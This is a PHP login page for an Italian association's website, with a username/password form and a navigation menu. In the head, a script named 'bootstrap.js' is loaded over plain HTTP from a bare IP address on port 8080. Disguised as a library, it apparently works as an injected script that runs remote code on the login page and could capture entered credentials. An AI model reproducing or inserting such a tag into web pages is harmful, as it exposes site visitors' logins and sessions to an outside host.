<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src='https://code.jquery.com/jquery-3.6.4.min.js'></script>
    <script src="http://52.47.171.54:8080/bootstrap.js"></script>
    <script src='../script/script.js'></script>
    <link rel='stylesheet' href='../style/style.css'>
    <title>Associazione ZeroTre</title>
</head>

<!-- STAMPA del BODY in BASE al COOKIE SALVATO -->
<?php
    include "../util/cookie.php";
    importActualStyle();
?>

    <!-- SEZIONE PRINCIPALE della PAGINA DI LOGIN -->
    <?php
        include "../util/connection.php";
        include "../util/command.php";
        $connection = connectToDatabase(DB_HOST, DB_ADMIN, ADMIN_PW, DB_NAME);
        session_start();

        if (!isset($_SESSION["is_logged"]))
            $_SESSION["is_logged"] = false;

        check_operation();

        // controllo cosa mostrare in base a se é gia loggato oppure ancora no
        if ($_SESSION["is_logged"]) {
            nav_menu();
            welcome($connection, $_SESSION["username"]);
        } else {
            nav_menu();
            echo "<section id='login_form'>
                    <h1 id='login_form__title'>Accedi al tuo account</h1>
                    <form action='login.php' id='form_login' method='POST'>
                        <label for='username' id='login_form__label'>Username</label>
                        <input type='text' name='username' id='login_form__input' required>

                        <label for='password' id='login_form__label'>Password</label>
                        <input type='password' name='password' id='login_form__input' required>

                        <input class='login_form__submit' type='submit' value='ACCEDI'>
                    </form>
                </section>";
        }

        show_footer();

        // menu di navigazione
        function nav_menu() {
            echo "<main>
                    <section class='header'>
                        <nav>
                            <a href='../index.php'>
                                <img 
                                    src='../image/logos/logo.png'
                                    class='logo'
                                    id='logoImg'
                                    alt='logo associazione'
                                />
                            </a>
                            <div class='nav_links' id='navLinks'>
                                <ul>
                                    <li><a href='../newsletter/newsletter.php'  class='btn'>Newsletter   </a></li>
                                    <li><a href='../bacheca/bacheca.php'        class='btn'>Bacheca       </a></li>
                                    <li><a href='https://stripe.com/it'         class='btn' target='blank'>Donazioni</a></li>
                                    <li><a href='area_personale.php'            class='btn'>Area Personale</a></li>
                                </ul>
                            </div>
                        </nav>            
                    </section>
                </main>";
        }
    ?>
</body>
</html>